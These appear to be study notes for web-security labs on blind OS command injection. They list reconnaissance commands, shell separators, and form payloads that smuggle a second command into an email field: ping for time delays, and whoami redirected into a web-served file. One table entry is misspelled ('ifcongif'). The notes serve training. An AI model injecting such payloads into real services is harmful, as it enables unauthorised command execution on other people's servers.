## General info
#### Commands
| Purpose of command   |    Linux    |    Windows    |
|:---------------------|:-----------:|:-------------:|
| Name of current user |   whoami    |    whoami     |
| OS                   |  uname -a   |      ver      |
| Net config           |  ifcongif   | ipconfig /all |
| Net connections      | netstat -an |  netstat -an  |
| Running pocesses     |   ps -ef    |   tasklist    |

#### Separators
- Windows
```
&
&&
|
||
```
- Unix-based
```
;
Newline (0x0a or \n)
`
injected command `

$(
injected command )
```

## LAB payloads
#### Blind OS command injection with time delays
- check all fields. find that email is the sink:
```
name=1&email=t%40t.com%26+ping+-c+10+127.0.0.1+%26&subject=aaa&message=bbb
```

#### Blind OS command injection with output redirection
- find submit feedback
- for email field
```
%26+ping+-c+10+127.0.0.1+%26 --> check if it works
```
```
%26+whoami+>+/var/www/images/whoami.txt%26

GET /image?filename=whoami.txt
```

#### Blind OS command injection with out-of-band interaction
TODO

#### Blind OS command injection with out-of-band data exfiltration
TODO